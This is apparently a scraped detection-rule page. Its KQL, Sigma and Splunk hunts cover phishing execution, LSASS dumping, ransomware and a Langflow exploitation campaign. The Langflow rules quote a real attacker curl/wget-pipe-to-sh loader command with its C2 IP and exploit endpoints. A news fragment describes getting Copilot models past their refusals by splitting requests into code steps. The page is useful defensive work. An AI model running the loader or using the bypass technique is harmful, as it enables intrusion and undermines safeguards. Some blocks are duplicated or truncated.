For years, account takeover (ATO) followed a predictable script. Attackers bought stolen credentials in bulk, ran them through automated tools, and waited for matches. Credential stuffing was cheap, scalable, and for defenders, relatively well understood. That era is ending. Not because attackers gave up, but because the front door finally got harder to kick in. Passkeys are now mainstream.

ATT&CKT1190 T1486 T1555.003 T1566
Click any ATT&CK pill below to open it on the Matrix

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → Suspicious browser extension installation
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement

| project TimeGenerated, DvcHostname, ActorUsername, RegistryKey,
          RegistryValue, RegistryValueData, ActingProcessName
| order by TimeGenerated desc

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

title: Office Application Spawning Script Host
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d07
status: experimental
description: |
    Word/Excel/Outlook/OneNote spawning powershell, cmd, wscript,
    cscript, mshta, rundll32, regsvr32 — classic macro / embedded-
    object payload signature.
references:
    - https://attack.mitre.org/techniques/T1059/
    - https://attack.mitre.org/techniques/T1566/001/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059
    - attack.t1566.001
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\winword.exe'
            - '\excel.exe'
            - '\powerpnt.exe'
            - '\outlook.exe'
            - '\onenote.exe'
            - '\mspub.exe'
            - '\visio.exe'
    selection_child:
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\mshta.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
    condition: selection_parent and selection_child
falsepositives:
    - Legitimate automation macros in trusted internal documents
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("winword.exe","excel.exe","powerpnt.exe","outlook.exe","onenote.exe","mspub.exe","visio.exe")
      AND Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","wmic.exe","bitsadmin.exe","certutil.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("winword.exe","excel.exe","powerpnt.exe","outlook.exe","onenote.exe","mspub.exe","visio.exe")
      AND Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","wmic.exe","bitsadmin.exe","certutil.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

title: LSASS Process Access Outside Microsoft-Signed Tooling
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d04
status: experimental
description: |

    category: process_access
    product: windows

            - '\svchost.exe'

Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"

       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`

GitHub Copilot Refuses Harmful Requests in Chat, Then Writes Them in Code

The Hacker News
2026-07-08 5 use cases 3 techniques 5 kill-chain phases detected

An AI coding assistant that refuses to answer a dangerous request in its chat box can answer it anyway if the same request is broken into small, ordinary-looking steps inside a code editor. That is the finding of a&nbsp;new study of GitHub Copilot&nbsp;by researchers Abhishek Kumar and Carsten Maple. The models they tested through Copilot, Claude from Anthropic, and Gemini from Google, refused

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code.
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → Suspicious browser extension installation
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
Suspicious browser extension installation Installation Medium
Side-loaded / unsigned extensions, often masquerading as wallets, productivity tools.

| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData,
          InitiatingProcessFileName, InitiatingProcessAccountName
ImRegistryEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where RegistryKey has_any (@"\Software\Google\Chrome\Extensions\",
                              @"\Software\Microsoft\Edge\Extensions\",
                              @"\Software\Mozilla\Firefox\Extensions\")
| project TimeGenerated, DvcHostname, ActorUsername, RegistryKey,
          RegistryValue, RegistryValueData, ActingProcessName
| order by TimeGenerated desc

status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies

references:

| order by files desc

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Langflow flow-ID enumeration chained to /api/v1/responses IDOR (CVE-2026-55255) · [LLM] Langflow unauth RCE payload POST to /api/v1/build_public_tmp (CVE-2026-33017)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Langflow host runs curl/wget piped to sh fetching /slt loader (45.207.216.55) · [LLM] Langflow exploitation marker file /tmp/lang_pwn created
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Langflow host beacons to JadePuffer/CVE-2026-55255 C2 (45.207.216.55:8084) · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
Langflow flow-ID enumeration chained to /api/v1/responses IDOR (CVE-2026-55255) AIExploitation High
Hunts the CVE-2026-55255 cross-tenant IDOR chain where one client first pulls GET /api/v1/flows/ to harvest flow UUIDs, then replays those UUIDs as the model parameter on POST /api/v1/responses to execute another user's flow. Article-specific because it correlates the exact enumeration-then-abuse endpoint pair on the same source within a short window. Rationale: Uses the exact Sysdig-documented sequence (GET /api/v1/flows/ harvest -> POST /api/v1/responses replay) confirmed in the Sysdig TRT blog; correlating the two Langflow endpoints on one source is far higher fidelity than either path alone. Defender AH has no inbound reverse-proxy request-path table, so defender_kql is intentionally empty. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited • https://github.com/advisories/GHSA-qrpv-q767-xqq2
ATT&CKT1190 T1213
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate Langflow power-user iterating flows via UI who hits /api/v1/flows/ then runs their OWN flow via /api/v1/responses
  • Automated CI/CD or synthetic-monitoring bot exercising the Langflow REST API
  • Internal load/perf test replaying enumerated flow IDs
  • Langflow admin auditing all flows across tenants for governance
Suppression filter
| where SrcIpAddr !in ("127.0.0.1") and DstIpAddr !in ("127.0.0.1")
Response runbook
1) TRIAGE: pull the app-layer Langflow logs for this SrcIpAddr and confirm the authenticated user's ID differs from the owner of the referenced flow_id UUID; check whether input body was 'leak api keys'. 2) CONTAIN: block the source IP at the WAF, force-rotate any LLM/cloud API keys stored in the affected flows, and pull the Langflow instance behind auth/VPN. 3) HUNT: pivot to the host for follow-on /api/v1/build_public_tmp RCE calls, curl/wget to 45.207.216.55, and the /tmp/lang_pwn marker.
let win = 30m;
ImWebSession
| where TimeGenerated > ago(7d)
| where Url has "/api/v1/flows" or Url has "/api/v1/responses" or Url has "/api/v1/build_public_tmp"
| summarize Urls = make_set(Url, 50), Methods = make_set(HttpMethod), Reqs = count(), FirstSeen = min(TimeGenerated) by SrcIpAddr, DstIpAddr, bin(TimeGenerated, win)
| extend U = tostring(Urls)
| where U has "/api/v1/flows" and (U has "/api/v1/responses" or U has "/api/v1/build_public_tmp")
| project FirstSeen, SrcIpAddr, DstIpAddr, Methods, Reqs, Urls
WEB
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count values(Web.url) as urls values(Web.http_method) as methods min(_time) as firstTime max(_time) as lastTime from datamodel=Web.Web where (Web.url="*/api/v1/flows*" OR Web.url="*/api/v1/responses*" OR Web.url="*/api/v1/build_public_tmp*") by Web.src Web.dest span=30m | `drop_dm_object_name(Web)` | where match(urls,"/api/v1/flows") AND (match(urls,"/api/v1/responses") OR match(urls,"/api/v1/build_public_tmp")) | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count values(Web.url) as urls values(Web.http_method) as methods min(_time) as firstTime max(_time) as lastTime from datamodel=Web.Web where (Web.url="*/api/v1/flows*" OR Web.url="*/api/v1/responses*" OR Web.url="*/api/v1/build_public_tmp*") by Web.src Web.dest span=30m | `drop_dm_object_name(Web)` | where match(urls,"/api/v1/flows") AND (match(urls,"/api/v1/responses") OR match(urls,"/api/v1/build_public_tmp")) | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Langflow unauth RCE payload POST to /api/v1/build_public_tmp (CVE-2026-33017) AIExploitation High
Alerts on POST requests to the Langflow /api/v1/build_public_tmp/<uuid>/flow endpoint used to inject the malicious custom component that achieves code execution, plus the auto_login/api_key recon probes that precede it. This is inherently exploit traffic — legitimate clients do not build public temp flows against this API path. Rationale: The /api/v1/build_public_tmp/<uuid>/flow POST is the exact RCE payload-injection endpoint Sysdig captured for CVE-2026-33017, and /api/v1/auto_login is the documented no-auth recon probe; both are exploit-only paths. Defender AH lacks inbound web-request telemetry so defender_kql is empty by design. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited • https://thehackernews.com/2026/07/cisa-adds-4-actively-exploited-adobe.html
ATT&CKT1190 T1059
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Langflow security scanner / VA tool (Nessus, Nuclei) probing the same endpoints in an authorized scan
  • Internal red-team validation of the CVE-2026-33017 patch
  • Langflow health-check monitoring that hits /api/v1/auto_login on a no-auth default deployment
  • Developer testing a public temp flow build in a sandbox instance
Response runbook
1) TRIAGE: confirm Langflow version < 1.9.1 and whether the instance is internet-exposed; inspect the request body/response for injected component code and outbound-connection attempts. 2) CONTAIN: isolate the Langflow host, block the source IP, and snapshot for forensics before the loader executes. 3) HUNT: on the host look for child shells of the Langflow/uvicorn process, curl/wget to 45.207.216.55:8084/slt, and creation of /tmp/lang_pwn.
ImWebSession
| where TimeGenerated > ago(7d)
| where Url has "/api/v1/build_public_tmp" or Url has "/api/v1/auto_login"
| project TimeGenerated, SrcIpAddr, DstIpAddr, HttpMethod, Url, HttpStatusCode, HttpUserAgent = HttpRequestHeaderUserAgent
| order by TimeGenerated desc

Langflow host runs curl/wget piped to sh fetching /slt loader (45.207.216.55) AIInstallation High
Detects the second-stage loader command executed via the Langflow RCE: a curl/wget to http://45.207.216.55:8084/slt piped into sh. This is the execution pivot on the compromised Linux AI host, spawned by the Langflow/python/uvicorn service account. Rationale: Matches the exact Sysdig-captured loader string '(curl -fsSL http://45.207.216.55:8084/slt || wget -q http://45.207.216.55:8084/slt) | sh' via the confirmed C2 IP plus the /slt path; the IP is corroborated by both the article and Sysdig TRT. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited • https://hackread.com/sysdig-jadepuffer-first-agentic-ransomware-operation/

Expected false positives · estimated rate: low — model-assessed, tune to your environment

  • Legitimate internal artifact server that happens to share the /slt path (unlikely given the hard-coded attacker IP)

| where InitiatingProcessAccountName !in~ ("root") or InitiatingProcessFileName has_any ("python","uvicorn","gunicorn","langflow","sh")

1) TRIAGE: confirm the parent is the Langflow/uvicorn/python service and pull the full process tree and download response. 2) CONTAIN: kill the process tree, network-isolate the host, and block 45.207.216.55 egress at the firewall. 3) HUNT: enumerate other hosts beaconing to 45.207.216.55:8084, look for the /tmp/lang_pwn marker, and check for harvested LLM/cloud API keys and pg_dump activity against the Langflow PostgreSQL DB.

ImProcessCreate

title: Langflow Loader - curl/wget to 45.207.216.55 slt Piped to Shell
id: b71e5d2a-9c34-4f18-8a02-7d5e0c9a1f33
description: Detects the CVE-2026-33017 second-stage loader command downloading http://45.207.216.55:8084/slt via curl/wget and piping to sh on a compromised Langflow host.
references:
  - https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited
author: SOC Detection Engineering
date: 2026/07/08
tags:
  - attack.t1059.004
  - attack.t1105
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    CommandLine|contains:
      - '45.207.216.55'
  selection_tool:
    CommandLine|contains:
      - '/slt'
      - 'curl'
      - 'wget'
  condition: selection and selection_tool
level: high
source:linux.auditd @auditd.type:EXECVE (@process.command_line:*45.207.216.55* OR @process.command_line:(*/slt* AND (*curl* OR *wget*)))
#event_simpleName=ProcessRollup2 CommandLine=/45\.207\.216\.55/ | regex("(/slt|curl|wget)", field=CommandLine) | groupBy([aid, ComputerName, ImageFileName, CommandLine, ParentBaseFileName], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process="*45.207.216.55*" OR Processes.process="*/slt*") AND (Processes.process="*curl*" OR Processes.process="*wget*" OR Processes.process_name IN ("curl","wget","sh","bash","dash")) by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process="*45.207.216.55*" OR Processes.process="*/slt*") AND (Processes.process="*curl*" OR Processes.process="*wget*" OR Processes.process_name IN ("curl","wget","sh","bash","dash")) by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Langflow host beacons to JadePuffer/CVE-2026-55255 C2 (45.207.216.55:8084) AICommand & Control High
Detects outbound connections from a Langflow host to the campaign C2 infrastructure, primarily 45.207.216.55 on port 8084 (loader host), plus the additional campaign IPs. High-fidelity because the primary IP/port is confirmed by Sysdig as the /slt loader and beacon endpoint. Rationale: 45.207.216.55:8084 is the Sysdig-confirmed loader/C2 endpoint (both article and Sysdig TRT); 45.131.66.106 and 64.20.53.230 came from the article's IOC list and are shipped as lower-confidence secondary IOCs pending independent confirmation. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited • https://www.securityweek.com/agentic-ai-used-to-conduct-ransomware-attack-via-langflow/
ATT&CKT1071.001 T1105
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel enrichment/scanning platform (e.g. a TIP or Shodan-style scanner) connecting to the C2 for research
  • Analyst IOC-validation curl from a jump box
  • Sinkhole or takedown infrastructure now resolving the IP
  • Shared-hosting IP reuse if the VPS is later repurposed for benign services
Suppression filter
| where InitiatingProcessFileName !in~ ("MsSense","MonitoringHost") and not (DeviceName has_any ("scanner","ti-","honeypot"))
Response runbook
1) TRIAGE: identify the initiating process on the source host and confirm whether the connection targets port 8084 / the /slt URI. 2) CONTAIN: block all three IPs at the perimeter, isolate any beaconing host, and rotate LLM/cloud API keys reachable from that host. 3) HUNT: sweep for regular-interval callbacks (beacon cadence) to these IPs, the curl|sh loader process, /tmp/lang_pwn, and JadePuffer ransomware/pg_dump activity against Langflow's PostgreSQL DB.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("45.207.216.55", "45.131.66.106", "64.20.53.230")
| summarize Conns = count(), Ports = make_set(RemotePort), FirstSeen = min(Timestamp), LastSeen = max(Timestamp) by DeviceName, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by LastSeen desc
ImNetworkSession
| where TimeGenerated > ago(7d)
| where DstIpAddr in ("45.207.216.55", "45.131.66.106", "64.20.53.230")
| summarize Conns = count(), Ports = make_set(DstPortNumber), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by SrcIpAddr, DstIpAddr, DvcHostname
| order by LastSeen desc
title: Langflow Campaign C2 Beacon - 45.207.216.55
id: c3f80a1e-4b52-4d6c-9a71-1e2f6b8d0a44
description: Detects outbound network connections to the CVE-2026-55255 / JadePuffer campaign C2 infrastructure, notably 45.207.216.55:8084 hosting the /slt loader.
references:
  - https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited
author: SOC Detection Engineering
date: 2026/07/08
tags:
  - attack.t1071.001
  - attack.t1105
logsource:
  category: network_connection
  product: linux
detection:
  selection:
    DestinationIp:
      - '45.207.216.55'
      - '45.131.66.106'
      - '64.20.53.230'
  condition: selection
level: high
source:linux.auditd @network.destination.ip:(45.207.216.55 OR 45.131.66.106 OR 64.20.53.230)
#event_simpleName=NetworkConnectIP4 (RemoteAddressIP4="45.207.216.55" OR RemoteAddressIP4="45.131.66.106" OR RemoteAddressIP4="64.20.53.230") | groupBy([aid, ComputerName, RemoteAddressIP4, RemotePort, ContextImageFileName], function=count())
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(All_Traffic.dest_port) as dest_ports from datamodel=Network_Traffic.All_Traffic where All_Traffic.dest IN ("45.207.216.55","45.131.66.106","64.20.53.230") by All_Traffic.src All_Traffic.dest All_Traffic.app | `drop_dm_object_name(All_Traffic)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(All_Traffic.dest_port) as dest_ports from datamodel=Network_Traffic.All_Traffic where All_Traffic.dest IN ("45.207.216.55","45.131.66.106","64.20.53.230") by All_Traffic.src All_Traffic.dest All_Traffic.app | `drop_dm_object_name(All_Traffic)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Langflow exploitation marker file /tmp/lang_pwn created AIInstallation High
Detects creation of the /tmp/lang_pwn marker file that the CVE-2026-55255/CVE-2026-33017 loader writes after successful exploitation on a Langflow host. A single, hard-coded artifact path unique to this campaign, making it a near-zero-FP confirmation of compromise. Rationale: /tmp/lang_pwn is the exact post-exploitation marker file Sysdig documented the loader writing on success; it is a unique, hard-coded artifact with essentially no benign collision. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited
ATT&CKT1105 T1059.004
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Analyst recreating the marker during IOC validation on a test host
  • Detection-engineering unit test seeding the file to validate this rule
  • Backup/restore of a previously compromised host image that still contains the artifact
Response runbook
